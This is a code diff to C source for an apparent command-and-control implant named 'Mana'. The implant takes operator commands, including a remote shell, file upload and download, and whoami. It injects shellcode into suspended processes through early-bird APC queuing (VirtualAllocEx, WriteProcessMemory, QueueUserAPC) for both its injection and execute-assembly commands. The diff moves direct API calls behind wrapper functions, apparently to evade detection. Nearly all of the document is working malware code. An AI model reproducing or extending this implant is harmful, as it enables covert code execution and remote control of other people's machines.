@@ -4,9 +4,9 @@
 #include <Package.h>
 #include <Core.h>
 #include <Apihashing.h>
+#include <ApiWrapper.h>
 
 #define Mana_COMMAND_LENGTH 11
-
 Mana_COMMAND Commands[ Mana_COMMAND_LENGTH ] = {
         { .ID = COMMAND_SHELL,            .Function = CommandShell },
         { .ID = COMMAND_DOWNLOAD,         .Function = CommandDownload },
@@ -95,6 +95,7 @@ VOID CommandDispatcher()
 
 VOID CommandEbapc( PPARSER Parser )
 {
+    
     PPACKAGE Package          = PackageCreate( COMMAND_OUTPUT );
     CHAR     Output[1024]     = { 0 };
     INT      Offset           = 0;
@@ -124,6 +125,8 @@ VOID CommandEbapc( PPARSER Parser )
     PROCESS_INFORMATION Pi = { 0 };
     Si.cb = sizeof(Si);
     
+
+
     // Create suspended process
     if ( !Api.CreateProcessA( ProcessPath, NULL, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &Si, &Pi ) )
     {
@@ -133,41 +136,41 @@ VOID CommandEbapc( PPARSER Parser )
     Offset += sprintf( Output + Offset, "[+] Created process PID: %d\r\n", Pi.dwProcessId );
 
     // Allocate memory
-    ShellcodeAddress = Api.VirtualAllocEx( Pi.hProcess, NULL, ShellSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE );
+    ShellcodeAddress = ManaVirtualAllocEx( Pi.hProcess, NULL, ShellSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE );
     if ( !ShellcodeAddress )
     {
         Offset += sprintf( Output + Offset, "[!] VirtualAllocEx failed: %d\r\n", Api.GetLastError() );
-        Api.TerminateProcess( Pi.hProcess, 0 );
+        ManaTerminateProcess( Pi.hProcess, 0 );
     }
 
     // Write shellcode 
-    if ( !Api.WriteProcessMemory( Pi.hProcess, ShellcodeAddress, Shellcode, ShellSize, NULL ) )
+    if ( !ManaWriteProcessMemory( Pi.hProcess, ShellcodeAddress, Shellcode, ShellSize, NULL ) )
     {
         Offset += sprintf( Output + Offset, "[!] WriteProcessMemory failed: %d\r\n", Api.GetLastError() );
-        Api.TerminateProcess( Pi.hProcess, 0 );
+        ManaTerminateProcess( Pi.hProcess, 0 );
     }
 
     // Change protection to RX
-    if ( !Api.VirtualProtectEx( Pi.hProcess, ShellcodeAddress, ShellSize, PAGE_EXECUTE_READWRITE, &dwOldProtection ) )
+    if ( !ManaVirtualProtectEx( Pi.hProcess, ShellcodeAddress, ShellSize, PAGE_EXECUTE_READWRITE, &dwOldProtection ) )
     {
         Offset += sprintf( Output + Offset, "[!] VirtualProtectEx failed: %d\r\n", Api.GetLastError() );
-        Api.TerminateProcess( Pi.hProcess, 0 );
+        ManaTerminateProcess( Pi.hProcess, 0 );
     }
 
     // Queue APC
-    if ( !Api.QueueUserAPC( (PAPCFUNC)ShellcodeAddress, Pi.hThread, 0 ) )
+    if ( !ManaQueueUserAPC( (PAPCFUNC)ShellcodeAddress, Pi.hThread, 0 ) )
     {
         Offset += sprintf( Output + Offset, "[!] QueueUserAPC failed: %d\r\n", Api.GetLastError() );
-        Api.TerminateProcess( Pi.hProcess, 0 );
+        ManaTerminateProcess( Pi.hProcess, 0 );
     }
 
     // Resume thread
-    Api.ResumeThread( Pi.hThread );
+    ManaResumeThread( Pi.hThread );
     Offset += sprintf( Output + Offset, "[+] Shellcode injected and executed!\r\n" );
 
     // Cleanup handles
-    Api.CloseHandle( Pi.hProcess );
-    Api.CloseHandle( Pi.hThread );
+    ManaCloseHandle( Pi.hProcess );
+    ManaCloseHandle( Pi.hThread );
 
     PackageAddBytes( Package, (PBYTE)Output, Offset );
     PackageTransmit( Package, NULL, NULL );
@@ -426,7 +429,7 @@ VOID CommandWhoami( PPARSER Parser ){
     privileges = (PTOKEN_PRIVILEGES)malloc(size);
 
     if (!Api.GetTokenInformation(token, TokenPrivileges, privileges, size, &size)) {
-        Api.CloseHandle(token);
+        ManaCloseHandle(token);
         free(privileges);
         return;
     }
@@ -468,7 +471,7 @@ VOID CommandWhoami( PPARSER Parser ){
     Offset += sprintf( Output + Offset, "\r\n[*] Total privileges: %lu\r\n", privileges->PrivilegeCount );
 
     free(privileges);
-    Api.CloseHandle(token);
+    ManaCloseHandle(token);
 
     PackageAddBytes( Package, (PBYTE)Output, Offset );
     PackageTransmit( Package, NULL, NULL );
@@ -512,13 +515,13 @@ VOID CommandShell( PPARSER Parser )
         return;
     }
 
-    Api.CloseHandle( hStdOutPipeWrite );
-    Api.CloseHandle( hStdInPipeRead );
+    ManaCloseHandle( hStdOutPipeWrite );
+    ManaCloseHandle( hStdInPipeRead );
 
     AnonPipeRead( hStdOutPipeRead );
 
-    Api.CloseHandle( hStdOutPipeRead );
-    Api.CloseHandle( hStdInPipeWrite );
+    ManaCloseHandle( hStdOutPipeRead );
+    ManaCloseHandle( hStdInPipeWrite );
 }
 
 VOID CommandUpload( PPARSER Parser )
@@ -557,7 +560,7 @@ VOID CommandUpload( PPARSER Parser )
     PackageTransmit( Package, NULL, NULL );
 
 Cleanup:
-    Api.CloseHandle( hFile );
+    ManaCloseHandle( hFile );
     hFile = NULL;
 }
 
@@ -602,7 +605,7 @@ VOID CommandDownload( PPARSER Parser )
 CleanupDownload:
     if ( hFile )
     {
-        Api.CloseHandle( hFile );
+        ManaCloseHandle( hFile );
         hFile = NULL;
     }
 
@@ -692,7 +695,7 @@ VOID CommandExecuteAssembly(PPARSER Parser)
             NULL,
             NULL,
             NULL,
-            TRUE,  // Inherit handles = TRUE 
+            TRUE,
             CREATE_SUSPENDED | CREATE_NO_WINDOW,
             NULL,
             NULL,
@@ -704,36 +707,36 @@ VOID CommandExecuteAssembly(PPARSER Parser)
     }
 
     // Allocate memory in target process
-    pRemote = Api.VirtualAllocEx(Pi.hProcess, NULL, ShellcodeSize,
+    pRemote = ManaVirtualAllocEx(Pi.hProcess, NULL, ShellcodeSize,
                              MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
     if (!pRemote)
     {
         Offset += sprintf(Output + Offset, "[!] VirtualAllocEx failed: %lu\r\n", Api.GetLastError());
-        Api.TerminateProcess(Pi.hProcess, 0);
+        ManaTerminateProcess(Pi.hProcess, 0);
         goto Cleanup;
     }
 
     // Write shellcode
-    if (!Api.WriteProcessMemory(Pi.hProcess, pRemote, Shellcode, ShellcodeSize, NULL))
+    if (!ManaWriteProcessMemory(Pi.hProcess, pRemote, Shellcode, ShellcodeSize, NULL))
     {
         Offset += sprintf(Output + Offset, "[!] WriteProcessMemory failed: %lu\r\n", Api.GetLastError());
-        Api.TerminateProcess(Pi.hProcess, 0);
+        ManaTerminateProcess(Pi.hProcess, 0);
         goto Cleanup;
     }
 
     // Make executable
-    Api.VirtualProtectEx(Pi.hProcess, pRemote, ShellcodeSize, PAGE_EXECUTE_READ, &OldProtect);
+    ManaVirtualProtectEx(Pi.hProcess, pRemote, ShellcodeSize, PAGE_EXECUTE_READ, &OldProtect);
 
     // Queue APC and resume
-    Api.QueueUserAPC((PAPCFUNC)pRemote, Pi.hThread, 0);
+    ManaQueueUserAPC((PAPCFUNC)pRemote, Pi.hThread, 0);
     Api.ResumeThread(Pi.hThread);
 
     // Close write end of pipe (so ReadFile will return when process exits)
-    Api.CloseHandle(hPipeWrite);
+    ManaCloseHandle(hPipeWrite);
     hPipeWrite = NULL;
 
     // Wait for process to complete (with timeout)
-    Api.WaitForSingleObject(Pi.hProcess, 60000);  // 60 second timeout
+    ManaWaitForSingleObject(Pi.hProcess, 60000);  // 60 second timeout
 
     // Read all available output from pipe
     TotalRead = 0;
@@ -791,12 +794,12 @@ Cleanup:
     if (Pi.hProcess)
     {
         Offset += sprintf(Output + Offset, "[!] Terminating spawned process\r\n");
-        Api.TerminateProcess(Pi.hProcess, 0);
+        ManaTerminateProcess(Pi.hProcess, 0);
     }
-    if (hPipeRead)   Api.CloseHandle(hPipeRead);
-    if (hPipeWrite)  Api.CloseHandle(hPipeWrite);
-    if (Pi.hThread)  Api.CloseHandle(Pi.hThread);
-    if (Pi.hProcess) Api.CloseHandle(Pi.hProcess);
+    if (hPipeRead)   ManaCloseHandle(hPipeRead);
+    if (hPipeWrite)  ManaCloseHandle(hPipeWrite);
+    if (Pi.hThread)  ManaCloseHandle(Pi.hThread);
+    if (Pi.hProcess) ManaCloseHandle(Pi.hProcess);
 
 Send:
     PackageAddBytes(Package, (PBYTE)Output, Offset);
